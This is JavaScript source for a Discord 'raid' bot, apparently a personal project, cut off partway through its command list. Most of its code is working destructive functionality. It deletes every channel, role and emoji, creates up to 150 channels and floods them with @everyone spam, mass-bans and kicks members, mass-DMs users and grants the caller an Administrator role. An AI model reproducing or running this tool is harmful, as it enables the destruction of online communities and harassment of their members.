require('dotenv').config();
const keepAlive = require('./keep_alive.js');
keepAlive();

const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  AttachmentBuilder,
  ChannelType,
  PermissionFlagsBits,
  Collection
} = require('discord.js');
const fs = require('fs');
const path = require('path');

// ==================== CONFIGURACIÓN AVANZADA ====================

const CONFIG = {
  DISCORD_TOKEN: process.env.DISCORD_TOKEN,
  ASSETS_DIR: './attached_assets',
  LOGS_DIR: './logs',
  DATABASE_FILE: './database.json',
  ICON_FILE: '40fd13ae2d1126651d55d5411b28b65f_1768104286084.png',
  TRIANGULITO_FILE: 'images.webp',
  BATCH_SIZE: 10,
  SPAM_COUNT: 20,
  MAX_CHANNELS: 150,
  CONCURRENCY: 5,
  RATE_LIMIT: {
    WINDOW_MS: 60000,
    MAX_REQUESTS: 10
  },
  CACHE_TTL: 3600000,
  TIMEOUT_MS: 30000,
  MAX_RETRIES: 3,
  RETRY_DELAY: 1000,
  OWNER_ID: process.env.OWNER_ID || null,
  PREFIX: '.',
  VERSION: '3.1',
  DEBUG_MODE: process.env.DEBUG_MODE === 'true'
};

// ==================== SISTEMA DE LOGGING ====================

class Logger {
  constructor() {
    this.logs = [];
    this.ensureLogsDir();
  }

  ensureLogsDir() {
    if (!fs.existsSync(CONFIG.LOGS_DIR)) {
      fs.mkdirSync(CONFIG.LOGS_DIR, { recursive: true });
    }
  }

  getTimestamp() {
    return new Date().toISOString();
  }

  log(level, message, data = null) {
    const logEntry = {
      timestamp: this.getTimestamp(),
      level,
      message,
      data: data || {}
    };

    this.logs.push(logEntry);

    const logColor = {
      'INFO': '\x1b[36m',
      'WARN': '\x1b[33m',
      'ERROR': '\x1b[31m',
      'SUCCESS': '\x1b[32m',
      'DEBUG': '\x1b[35m'
    };

    const reset = '\x1b[0m';
    const color = logColor[level] || '\x1b[37m';
    
    console.log(`${color}[${level}]${reset} ${this.getTimestamp()} - ${message}`, data || '');

    if (level === 'ERROR' || level === 'WARN') {
      this.writeToFile(level, message, data);
    }

    if (this.logs.length > 1000) {
      this.logs.shift();
    }
  }

  writeToFile(level, message, data) {
    const filename = path.join(CONFIG.LOGS_DIR, `${level.toLowerCase()}-${new Date().toISOString().split('T')[0]}.log`);
    const logEntry = `[${this.getTimestamp()}] ${message}\n${JSON.stringify(data)}\n---\n`;
    fs.appendFileSync(filename, logEntry);
  }

  info(msg, data) { this.log('INFO', msg, data); }
  warn(msg, data) { this.log('WARN', msg, data); }
  error(msg, data) { this.log('ERROR', msg, data); }
  success(msg, data) { this.log('SUCCESS', msg, data); }
  debug(msg, data) { if (CONFIG.DEBUG_MODE) this.log('DEBUG', msg, data); }
}

const logger = new Logger();

// ==================== SISTEMA DE BASE DE DATOS LOCAL ====================

class Database {
  constructor(filename) {
    this.filename = filename;
    this.data = this.load();
  }

  load() {
    try {
      if (!fs.existsSync(this.filename)) {
        const defaultData = {
          commands: [],
          raidStats: [],
          users: {},
          guilds: {}
        };
        fs.writeFileSync(this.filename, JSON.stringify(defaultData, null, 2));
        return defaultData;
      }
      const content = fs.readFileSync(this.filename, 'utf-8');
      return JSON.parse(content);
    } catch (err) {
      logger.error('Error cargando base de datos', { error: err.message });
      return { commands: [], raidStats: [], users: {}, guilds: {} };
    }
  }

  save() {
    try {
      fs.writeFileSync(this.filename, JSON.stringify(this.data, null, 2));
    } catch (err) {
      logger.error('Error guardando base de datos', { error: err.message });
    }
  }

  addCommand(cmd, user, guild) {
    this.data.commands.push({
      command: cmd,
      user,
      guild,
      timestamp: new Date().toISOString()
    });
    this.save();
  }

  addRaidStat(guildId, action, count) {
    this.data.raidStats.push({
      guildId,
      action,
      count,
      timestamp: new Date().toISOString()
    });
    this.save();
  }

  getUserStats(userId) {
    return this.data.users[userId] || { commands: 0, bans: 0, warnings: 0 };
  }

  updateUserStats(userId, stats) {
    this.data.users[userId] = { ...this.getUserStats(userId), ...stats };
    this.save();
  }

  getGuildStats(guildId) {
    return this.data.guilds[guildId] || { raidCount: 0, lastRaid: null };
  }

  updateGuildStats(guildId, stats) {
    this.data.guilds[guildId] = { ...this.getGuildStats(guildId), ...stats };
    this.save();
  }
}

const database = new Database(CONFIG.DATABASE_FILE);

// ==================== SISTEMA DE RATE LIMITING ====================

class RateLimiter {
  constructor() {
    this.limits = new Collection();
  }

  check(userId) {
    const now = Date.now();
    const userLimit = this.limits.get(userId) || { requests: 0, resetTime: now + CONFIG.RATE_LIMIT.WINDOW_MS };

    if (now > userLimit.resetTime) {
      return { allowed: true, remaining: CONFIG.RATE_LIMIT.MAX_REQUESTS };
    }

    if (userLimit.requests >= CONFIG.RATE_LIMIT.MAX_REQUESTS) {
      return { allowed: false, resetIn: userLimit.resetTime - now };
    }

    userLimit.requests++;
    this.limits.set(userId, userLimit);
    return { allowed: true, remaining: CONFIG.RATE_LIMIT.MAX_REQUESTS - userLimit.requests };
  }

  reset(userId) {
    this.limits.delete(userId);
  }
}

const rateLimiter = new RateLimiter();

// ==================== SISTEMA DE CACHÉ ====================

class Cache {
  constructor() {
    this.cache = new Map();
  }

  set(key, value, ttl = CONFIG.CACHE_TTL) {
    const expireTime = Date.now() + ttl;
    this.cache.set(key, { value, expireTime });
  }

  get(key) {
    const item = this.cache.get(key);
    if (!item) return null;

    if (Date.now() > item.expireTime) {
      this.cache.delete(key);
      return null;
    }

    return item.value;
  }

  clear() {
    this.cache.clear();
  }

  has(key) {
    return this.get(key) !== null;
  }

  delete(key) {
    this.cache.delete(key);
  }

  size() {
    return this.cache.size;
  }
}

const cache = new Cache();

// ==================== UTILIDADES AVANZADAS ====================

class BotUtils {
  static loadBuffer(filename) {
    try {
      const cacheKey = `buffer_${filename}`;
      const cached = cache.get(cacheKey);
      if (cached) return cached;

      const filepath = path.join(CONFIG.ASSETS_DIR, filename);
      if (!fs.existsSync(filepath)) {
        logger.warn(`Archivo no encontrado: ${filepath}`);
        return null;
      }
      
      const buffer = fs.readFileSync(filepath);
      cache.set(cacheKey, buffer, CONFIG.CACHE_TTL);
      return buffer;
    } catch (err) {
      logger.error(`Error cargando ${filename}`, { error: err.message });
      return null;
    }
  }

  static async batchExecute(items, concurrency, fn, label = 'Operación') {
    const results = [];
    const failed = [];
    const total = items.length;
    let completed = 0;

    try {
      for (let i = 0; i < items.length; i += concurrency) {
        const batch = items.slice(i, i + concurrency);
        const batchResults = await Promise.allSettled(batch.map(fn));
        
        batchResults.forEach((result, idx) => {
          if (result.status === 'fulfilled') {
            results.push(result.value);
          } else {
            failed.push({ item: batch[idx], error: result.reason });
          }
          completed++;
        });

        const progress = Math.round((completed / total) * 100);
        logger.debug(`${label} - Progreso: ${progress}%`);
      }

      logger.success(`${label} completado`, { total, completed, failed: failed.length });
      return { results, failed };
    } catch (err) {
      logger.error(`Error en batchExecute para ${label}`, { error: err.message });
      return { results, failed };
    }
  }

  static async deleteAllChannels(guild, excludeReason = false) {
    try {
      const channels = await guild.channels.fetch();
      const result = await this.batchExecute(
        [...channels.values()],
        CONFIG.CONCURRENCY,
        c => c.delete().catch(() => {}),
        'Eliminación de canales'
      );

      database.addRaidStat(guild.id, 'delete_channels', result.results.length);
      logger.success(`Canales eliminados: ${result.results.length}/${channels.size}`, { guildId: guild.id });
      return result;
    } catch (err) {
      logger.error('Error eliminando canales', { error: err.message, guildId: guild.id });
      throw err;
    }
  }

  static async createChannels(guild, name, count) {
    try {
      const created = [];
      const failed = [];

      for (let i = 0; i < count; i += CONFIG.BATCH_SIZE) {
        const size = Math.min(CONFIG.BATCH_SIZE, count - i);
        const batch = await Promise.allSettled(
          Array.from({ length: size }, () =>
            guild.channels.create({ 
              name, 
              type: ChannelType.GuildText,
              topic: `Creado por bot-raid v${CONFIG.VERSION}`
            })
          )
        );

        batch.forEach(r => {
          if (r.status === 'fulfilled' && r.value) {
            created.push(r.value);
          } else {
            failed.push(r.reason);
          }
        });
      }

      database.addRaidStat(guild.id, 'create_channels', created.length);
      logger.success(`Canales creados: ${created.length}`, { guildId: guild.id });
      return { channels: created, failed };
    } catch (err) {
      logger.error('Error creando canales', { error: err.message, guildId: guild.id });
      return { channels: [], failed: [] };
    }
  }

  static async spamChannels(channels, msgCount, messageBuilder, delay = 100) {
    try {
      let totalSpammed = 0;
      const failedChannels = [];

      for (const channel of channels) {
        if (!channel || !channel.isTextBased()) continue;

        try {
          for (let i = 0; i < msgCount; i++) {
            try {
              const msg = messageBuilder();
              logger.debug(`Enviando mensaje a canal ${channel.id}`, { attempt: i + 1 });
              await channel.send(msg);
              totalSpammed++;
              await this.sleep(delay);
            } catch (err) {
              if (err.code !== 50013) {
                logger.debug('Error enviando mensaje', { error: err.message, channelId: channel.id });
              }
              break;
            }
          }
        } catch (err) {
          failedChannels.push(channel.id);
          logger.warn('Error en canal de spam', { error: err.message, channelId: channel.id });
        }
      }

      if (channels[0]?.guild?.id) {
        database.addRaidStat(channels[0].guild.id, 'spam', totalSpammed);
      }
      logger.success(`Spam completado: ${totalSpammed} mensajes en ${channels.length} canales`, { failed: failedChannels.length });
      return totalSpammed;
    } catch (err) {
      logger.error('Error en spam', { error: err.message });
      return 0;
    }
  }

  static async deleteAllRoles(guild) {
    try {
      const roles = await guild.roles.fetch();
      const toDelete = roles.filter(r => 
        r.editable && 
        r.name !== '@everyone' && 
        !r.managed
      );

      const result = await this.batchExecute(
        [...toDelete.values()],
        CONFIG.CONCURRENCY,
        r => r.delete().catch(() => {}),
        'Eliminación de roles'
      );

      database.addRaidStat(guild.id, 'delete_roles', result.results.length);
      logger.success(`Roles eliminados: ${result.results.length}`);
      return result;
    } catch (err) {
      logger.error('Error eliminando roles', { error: err.message });
      throw err;
    }
  }

  static async deleteAllEmojis(guild) {
    try {
      const [emojis, stickers] = await Promise.all([
        guild.emojis.fetch().catch(() => new Collection()),
        guild.stickers.fetch().catch(() => new Collection())
      ]);

      const items = [...emojis.values(), ...stickers.values()];
      const result = await this.batchExecute(
        items,
        CONFIG.CONCURRENCY,
        item => item.delete().catch(() => {}),
        'Eliminación de emojis y stickers'
      );

      database.addRaidStat(guild.id, 'delete_emojis', result.results.length);
      logger.success(`Emojis/Stickers eliminados: ${result.results.length}`);
      return result;
    } catch (err) {
      logger.error('Error eliminando emojis', { error: err.message });
      throw err;
    }
  }

  static async dmAllMembers(guild, message) {
    try {
      const members = await guild.members.fetch({ limit: null });
      const humanMembers = members.filter(m => !m.user.bot);

      const result = await this.batchExecute(
        [...humanMembers.values()],
        CONFIG.CONCURRENCY,
        m => m.send({ content: message }).catch(() => {}),
        'Envío de DMs'
      );

      database.addRaidStat(guild.id, 'dm_members', result.results.length);
      logger.success(`DMs enviados: ${result.results.length}/${humanMembers.size}`);
      return result;
    } catch (err) {
      logger.error('Error enviando DMs', { error: err.message });
      throw err;
    }
  }

  static async banAllMembers(guild, client) {
    try {
      const members = await guild.members.fetch({ force: true, limit: null });
      const bannable = members.filter(m => 
        m.bannable && 
        m.id !== client.user.id && 
        !m.user.bot
      );

      const result = await this.batchExecute(
        [...bannable.values()],
        CONFIG.CONCURRENCY,
        m => m.ban({ 
          deleteMessageSeconds: 604800, 
          reason: `Raideado por ${client.user.username} v${CONFIG.VERSION}` 
        }).catch(() => {}),
        'Baneo masivo'
      );

      database.addRaidStat(guild.id, 'ban_members', result.results.length);
      logger.success(`Miembros baneados: ${result.results.length}/${bannable.size}`);
      return result;
    } catch (err) {
      logger.error('Error baneando miembros', { error: err.message });
      throw err;
    }
  }

  static async renameAllChannels(guild, name) {
    try {
      const channels = await guild.channels.fetch();
      const result = await this.batchExecute(
        [...channels.values()],
        CONFIG.CONCURRENCY,
        c => c.setName(name.substring(0, 100)).catch(() => {}),
        'Renombrado de canales'
      );

      database.addRaidStat(guild.id, 'rename_channels', result.results.length);
      logger.success(`Canales renombrados: ${result.results.length}`);
      return result;
    } catch (err) {
      logger.error('Error renombrando canales', { error: err.message });
      throw err;
    }
  }

  static async kickAllMembers(guild, client) {
    try {
      const members = await guild.members.fetch({ force: true, limit: null });
      const kickable = members.filter(m => 
        m.kickable && 
        m.id !== client.user.id && 
        !m.user.bot
      );

      const result = await this.batchExecute(
        [...kickable.values()],
        CONFIG.CONCURRENCY,
        m => m.kick(`Raideado por ${client.user.username}`).catch(() => {}),
        'Expulsión masiva'
      );

      database.addRaidStat(guild.id, 'kick_members', result.results.length);
      logger.success(`Miembros expulsados: ${result.results.length}/${kickable.size}`);
      return result;
    } catch (err) {
      logger.error('Error expulsando miembros', { error: err.message });
      throw err;
    }
  }

  static async createCategories(guild, categories) {
    try {
      const created = [];
      const result = await this.batchExecute(
        categories,
        CONFIG.CONCURRENCY,
        cat => guild.channels.create({
          name: cat.name.substring(0, 100),
          type: ChannelType.GuildCategory
        }).catch(() => {}),
        'Creación de categorías'
      );

      logger.success(`Categorías creadas: ${result.results.length}`);
      return result.results;
    } catch (err) {
      logger.error('Error creando categorías', { error: err.message });
      return [];
    }
  }

  static async sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  static formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
  }

  static getRandomColor() {
    return Math.floor(Math.random() * 16777215);
  }

  static async withRetry(fn, maxRetries = CONFIG.MAX_RETRIES, delay = CONFIG.RETRY_DELAY) {
    for (let i = 0; i < maxRetries; i++) {
      try {
        return await fn();
      } catch (err) {
        if (i === maxRetries - 1) throw err;
        logger.debug(`Reintentando... ${i + 1}/${maxRetries}`);
        await this.sleep(delay);
      }
    }
  }
}

// ==================== EMBEDS PREDEFINIDOS ====================

const EMBEDS = {
  invasion: () => new EmbedBuilder()
    .setColor(0xFF0000)
    .setTitle('⚠️ INVASIÓN EN CURSO')
    .setDescription('⚠️ PARCE QUE TUNG TUNG SAHUR ESTA DOMINANDO EL SERVER\n**¡TODOS SALGANSE AHORAA!**')
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` }),

  triangulito: () => new EmbedBuilder()
    .setColor(0xFF0000)
    .setTitle('👑 TRIANGULITO ES EL MEJOR')
    .setDescription('**¡HABEIS SIDO RAIDEADO POR EL GOAT DE TRIANGULITO!**')
    .setImage('attachment://triangulito.webp')
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` }),

  error: (message) => new EmbedBuilder()
    .setColor(0xFF0000)
    .setTitle('❌ Error')
    .setDescription(message)
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` }),

  success: (message) => new EmbedBuilder()
    .setColor(0x00FF00)
    .setTitle('✅ Operación exitosa')
    .setDescription(message)
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` }),

  warning: (message) => new EmbedBuilder()
    .setColor(0xFFFF00)
    .setTitle('⚠️ Advertencia')
    .setDescription(message)
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` }),

  help: () => new EmbedBuilder()
    .setColor(0xFF0000)
    .setTitle('📋 MENÚ DE AYUDA - Bot Raid')
    .setDescription('**Comandos disponibles:**')
    .addFields(
      { name: '🔴 DESTRUCTIVOS', value: '`.diversion` | `.bypass <msg>` | `.delroles` | `.delemojis` | `.limpiar` | `.ban` | `.kick` | `.triangulo`', inline: false },
      { name: '📧 COMUNICACIÓN', value: '`.md <mensaje>` - Envía DM a todos los miembros', inline: false },
      { name: '👑 ADMIN', value: '`.admin` - Te da rol de administrador', inline: false },
      { name: '🔧 UTILIDADES', value: '`.stats` | `.info` | `.status` | `.clear`', inline: false },
      { name: '🛠️ MANTENIMIENTO', value: '`.nodiversion` - Restaura el servidor', inline: false },
      { name: '📚 INFORMACIÓN', value: '`.ayuda` - Muestra este menú | `.version` - Muestra la versión', inline: false }
    )
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION} - Por Triangulito The Goat` }),

  stats: (data) => new EmbedBuilder()
    .setColor(0x0099FF)
    .setTitle('📊 Estadísticas')
    .addFields(
      { name: '📦 Cache', value: `${data.cacheSize} items`, inline: true },
      { name: '💾 Base de datos', value: `${data.dbCommands} comandos registrados`, inline: true },
      { name: '⏱️ Uptime', value: data.uptime, inline: true },
      { name: '💾 Memoria', value: data.memory, inline: true },
      { name: '🔴 Raids totales', value: `${data.raidCount}`, inline: true },
      { name: '📅 Fecha', value: new Date().toLocaleString('es-ES'), inline: true }
    )
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` }),

  info: (client) => new EmbedBuilder()
    .setColor(0x00FF00)
    .setTitle('ℹ️ Información del Bot')
    .addFields(
      { name: 'Versión', value: CONFIG.VERSION, inline: true },
      { name: 'Token', value: CONFIG.DISCORD_TOKEN ? '✅ Configurado' : '❌ No configurado', inline: true },
      { name: 'Modo Debug', value: CONFIG.DEBUG_MODE ? '🔴 Activado' : '🟢 Desactivado', inline: true },
      { name: 'Servidores', value: `${client.guilds.cache.size}`, inline: true },
      { name: 'Usuario Bot', value: `${client.user.tag}`, inline: true },
      { name: 'ID del Bot', value: client.user.id, inline: true }
    )
    .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` })
};

// ==================== COMANDOS ====================

const COMMANDS = {
  async diversion(message, guild, client, args) {
    try {
      logger.info('Ejecutando comando: diversion');
      
      await message.reply({ embeds: [EMBEDS.warning('🚀 Iniciando operación diversion...')] }).catch(() => {});
      
      await BotUtils.deleteAllChannels(guild);
      const { channels: newChannels } = await BotUtils.createChannels(guild, 'TRIANGULITO THE GOAT', CONFIG.MAX_CHANNELS);
      
      const msgCount = Math.min(CONFIG.SPAM_COUNT, args[0] ? parseInt(args[0]) : CONFIG.SPAM_COUNT);
      await BotUtils.spamChannels(newChannels, msgCount, () => ({
        content: '@everyone',
        embeds: [EMBEDS.invasion()]
      }), 50);

      await Promise.all([
        guild.setName('TRIANGULITO GOAT').catch(() => {}),
        BUFFERS.icon ? guild.setIcon(BUFFERS.icon).catch(() => {}) : null
      ]);

      database.updateGuildStats(guild.id, { lastRaid: new Date().toISOString(), raidCount: (database.getGuildStats(guild.id).raidCount || 0) + 1 });
      database.addCommand('diversion', message.author.id, guild.id);
      
      logger.success('Comando diversion completado', { guildId: guild.id });
    } catch (err) {
      logger.error('Error en comando diversion', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error ejecutando diversion')] }).catch(() => {});
    }
  },

  async bypass(message, guild, client, args) {
    try {
      const text = args.join(' ') || 'bypass';
      const channels = await guild.channels.fetch();
      
      await BotUtils.batchExecute(
        [...channels.values()],
        CONFIG.CONCURRENCY,
        async (channel) => {
          try {
            if (channel.manageable) await channel.setName(text.substring(0, 100));
            if (channel.isTextBased()) await channel.send({ content: text });
          } catch (err) {
            logger.debug('Error en bypass', { error: err.message });
          }
        },
        'Operación bypass'
      );

      database.addCommand('bypass', message.author.id, guild.id);
      logger.success('Comando bypass completado');
    } catch (err) {
      logger.error('Error en comando bypass', { error: err.message });
    }
  },

  async delroles(message, guild, client, args) {
    try {
      await BotUtils.deleteAllRoles(guild);
      database.addCommand('delroles', message.author.id, guild.id);
      logger.success('Comando delroles completado');
    } catch (err) {
      logger.error('Error en comando delroles', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error eliminando roles')] }).catch(() => {});
    }
  },

  async delemojis(message, guild, client, args) {
    try {
      await BotUtils.deleteAllEmojis(guild);
      database.addCommand('delemojis', message.author.id, guild.id);
      logger.success('Comando delemojis completado');
    } catch (err) {
      logger.error('Error en comando delemojis', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error eliminando emojis')] }).catch(() => {});
    }
  },

  async limpiar(message, guild, client, args) {
    try {
      await BotUtils.deleteAllChannels(guild);
      database.addCommand('limpiar', message.author.id, guild.id);
      logger.success('Comando limpiar completado');
    } catch (err) {
      logger.error('Error en comando limpiar', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error limpiando canales')] }).catch(() => {});
    }
  },

  async ban(message, guild, client, args) {
    try {
      await BotUtils.banAllMembers(guild, client);
      database.addCommand('ban', message.author.id, guild.id);
      logger.success('Comando ban completado');
    } catch (err) {
      logger.error('Error en comando ban', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error baneando miembros')] }).catch(() => {});
    }
  },

  async kick(message, guild, client, args) {
    try {
      await BotUtils.kickAllMembers(guild, client);
      database.addCommand('kick', message.author.id, guild.id);
      logger.success('Comando kick completado');
    } catch (err) {
      logger.error('Error en comando kick', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error expulsando miembros')] }).catch(() => {});
    }
  },

  async md(message, guild, client, args) {
    try {
      const text = args.join(' ');
      if (!text) {
        return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un mensaje')] }).catch(() => {});
      }
      await BotUtils.dmAllMembers(guild, text);
      database.addCommand('md', message.author.id, guild.id);
      logger.success('Comando md completado');
    } catch (err) {
      logger.error('Error en comando md', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error enviando mensajes')] }).catch(() => {});
    }
  },

  async admin(message, guild, client, member) {
    try {
      const role = await guild.roles.create({
        name: 'Papuamigo god',
        permissions: [PermissionFlagsBits.Administrator],
        color: '#FF0000'
      });
      await member.roles.add(role);
      
      database.addCommand('admin', message.author.id, guild.id);
      logger.success(`Rol de admin dado a ${member.user.tag}`);
      
      message.reply({ embeds: [EMBEDS.success(`✅ Rol admin asignado a ${member.user.tag}`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando admin', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error creando rol admin')] }).catch(() => {});
    }
  },

  async triangulo(message, guild, client, args) {
    try {
      logger.info('Ejecutando comando: triangulo');
      
      await BotUtils.deleteAllChannels(guild);
      const { channels: newChannels } = await BotUtils.createChannels(guild, 'TRIANGULITO ES EL MEJOR', CONFIG.MAX_CHANNELS);
      
      logger.info('Canales creados para triangulo', { count: newChannels.length });

      if (BUFFERS.triangulito) {
        logger.info('Buffer triangulito disponible, iniciando spam');
        await BotUtils.spamChannels(newChannels, 10, () => ({
          content: '@everyone',
          embeds: [EMBEDS.triangulito()],
          files: [new AttachmentBuilder(BUFFERS.triangulito, { name: 'triangulito.webp' })]
        }), 150);
      } else {
        logger.warn('Buffer triangulito no disponible, enviando sin imagen');
        await BotUtils.spamChannels(newChannels, 10, () => ({
          content: '@everyone',
          embeds: [EMBEDS.triangulito()]
        }), 150);
      }

      database.addCommand('triangulo', message.author.id, guild.id);
      logger.success('Comando triangulo completado');
    } catch (err) {
      logger.error('Error en comando triangulo', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error en operación triangulo')] }).catch(() => {});
    }
  },

  async ayuda(message, client, args) {
    try {
      message.reply({ embeds: [EMBEDS.help()] }).catch(() => {});
      logger.info('Comando ayuda ejecutado');
    } catch (err) {
      logger.error('Error en comando ayuda', { error: err.message });
    }
  },

  async version(message, client, args) {
    try {
      const embed = new EmbedBuilder()
        .setColor(0x0099FF)
        .setTitle('📦 Información de Versión')
        .addFields(
          { name: 'Versión del Bot', value: CONFIG.VERSION, inline: true },
          { name: 'Node.js', value: process.version, inline: true },
          { name: 'Discord.js', value: require('discord.js').version, inline: true },
          { name: 'Uptime', value: this.formatUptime(client.uptime), inline: true }
        )
        .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando version', { error: err.message });
    }
  },

  async stats(message, client, args) {
    try {
      const uptime = this.formatUptime(client.uptime);
      const memory = BotUtils.formatBytes(process.memoryUsage().heapUsed);
      
      const embed = EMBEDS.stats({
        cacheSize: cache.size(),
        dbCommands: database.data.commands.length,
        uptime,
        memory,
        raidCount: database.data.raidStats.length
      });

      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando stats', { error: err.message });
    }
  },

  async info(message, client, args) {
    try {
      const embed = EMBEDS.info(client);
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando info', { error: err.message });
    }
  },

  async clear(message, guild, client, args) {
    try {
      cache.clear();
      message.reply({ embeds: [EMBEDS.success('✅ Cache limpiado correctamente')] }).catch(() => {});
      logger.success('Cache limpiado por comando');
    } catch (err) {
      logger.error('Error en comando clear', { error: err.message });
    }
  },

  async nodiversion(message, guild, client, args) {
    try {
      const categories = [
        {
          name: '📢 INFORMACIÓN',
          channels: [
            { name: 'bienvenidas', type: ChannelType.GuildText },
            { name: 'reglas', type: ChannelType.GuildText },
            { name: 'anuncios', type: ChannelType.GuildText }
          ]
        },
        {
          name: '💬 GENERAL',
          channels: [
            { name: 'chat-general', type: ChannelType.GuildText },
            { name: 'fotos', type: ChannelType.GuildText },
            { name: 'comandos', type: ChannelType.GuildText }
          ]
        },
        {
          name: '🎤 VOCAL',
          channels: [
            { name: 'General', type: ChannelType.GuildVoice },
            { name: 'Música', type: ChannelType.GuildVoice },
            { name: 'Gaming', type: ChannelType.GuildVoice }
          ]
        }
      ];

      const roles = [
        { name: 'Admin', color: 'Red', permissions: [PermissionFlagsBits.Administrator] },
        { name: 'Moderador', color: 'Green', permissions: [PermissionFlagsBits.ManageMessages, PermissionFlagsBits.KickMembers] },
        { name: 'Usuario Verificado', color: 'Blue', permissions: [] }
      ];

      // Crear categorías y canales
      for (const catData of categories) {
        try {
          const category = await guild.channels.create({
            name: catData.name,
            type: ChannelType.GuildCategory
          });
          for (const ch of catData.channels) {
            await guild.channels.create({
              name: ch.name,
              type: ch.type,
              parent: category.id
            }).catch(() => {});
          }
        } catch (err) {
          logger.warn(`Error creando categoría ${catData.name}`, { error: err.message });
        }
      }

      // Crear roles
      for (const r of roles) {
        await guild.roles.create({
          name: r.name,
          color: r.color,
          permissions: r.permissions
        }).catch(() => {});
      }

      database.addCommand('nodiversion', message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success('✅ Servidor restaurado correctamente')] }).catch(() => {});
      logger.success('Comando nodiversion completado');
    } catch (err) {
      logger.error('Error en comando nodiversion', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error restaurando servidor')] }).catch(() => {});
    }
  },

  async rename(message, guild, client, args) {
    try {
      const name = args.join(' ');
      if (!name) {
        return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un nombre para el servidor')] }).catch(() => {});
      }
      await guild.setName(name.substring(0, 100));
      database.addCommand('rename', message.author.id, guild.id);
      logger.success(`Servidor renombrado a: ${name}`);
      message.reply({ embeds: [EMBEDS.success(`✅ Servidor renombrado a: ${name}`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando rename', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error renombrando servidor')] }).catch(() => {});
    }
  },

  async createchannel(message, guild, client, args) {
    try {
      const channelName = args.join(' ') || 'nuevo-canal';
      const channel = await guild.channels.create({
        name: channelName.substring(0, 100),
        type: ChannelType.GuildText
      });
      database.addCommand('createchannel', message.author.id, guild.id);
      logger.success(`Canal creado: ${channel.name}`);
      message.reply({ embeds: [EMBEDS.success(`✅ Canal creado: #${channel.name}`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando createchannel', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error creando canal')] }).catch(() => {});
    }
  },

  async deletechannel(message, guild, client, args) {
    try {
      const channel = message.mentions.channels.first() || guild.channels.cache.get(args[0]);
      if (!channel) {
        return message.reply({ embeds: [EMBEDS.error('Debes mencionar un canal o proporcionar su ID')] }).catch(() => {});
      }
      await channel.delete();
      database.addCommand('deletechannel', message.author.id, guild.id);
      logger.success(`Canal eliminado: ${channel.name}`);
      message.reply({ embeds: [EMBEDS.success(`✅ Canal eliminado`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando deletechannel', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error eliminando canal')] }).catch(() => {});
    }
  },

  async creerole(message, guild, client, args) {
    try {
      const roleName = args.join(' ') || 'Nuevo Rol';
      const role = await guild.roles.create({
        name: roleName.substring(0, 100),
        color: BotUtils.getRandomColor(),
        permissions: []
      });
      database.addCommand('creerole', message.author.id, guild.id);
      logger.success(`Rol creado: ${role.name}`);
      message.reply({ embeds: [EMBEDS.success(`✅ Rol creado: @${role.name}`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando creerole', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error creando rol')] }).catch(() => {});
    }
  },

  async deleterole(message, guild, client, args) {
    try {
      const role = message.mentions.roles.first() || guild.roles.cache.get(args[0]);
      if (!role) {
        return message.reply({ embeds: [EMBEDS.error('Debes mencionar un rol o proporcionar su ID')] }).catch(() => {});
      }
      if (!role.editable) {
        return message.reply({ embeds: [EMBEDS.error('No puedo eliminar ese rol')] }).catch(() => {});
      }
      await role.delete();
      database.addCommand('deleterole', message.author.id, guild.id);
      logger.success(`Rol eliminado: ${role.name}`);
      message.reply({ embeds: [EMBEDS.success(`✅ Rol eliminado`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando deleterole', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error eliminando rol')] }).catch(() => {});
    }
  },

  async servericon(message, guild, client, args) {
    try {
      const icon = message.attachments.first();
      if (!icon) {
        return message.reply({ embeds: [EMBEDS.error('Debes adjuntar una imagen para usar como icono')] }).catch(() => {});
      }
      await guild.setIcon(icon.url);
      database.addCommand('servericon', message.author.id, guild.id);
      logger.success('Ícono del servidor actualizado');
      message.reply({ embeds: [EMBEDS.success('✅ Ícono del servidor actualizado')] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando servericon', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error actualizando ícono')] }).catch(() => {});
    }
  },

  async mutechannel(message, guild, client, args) {
    try {
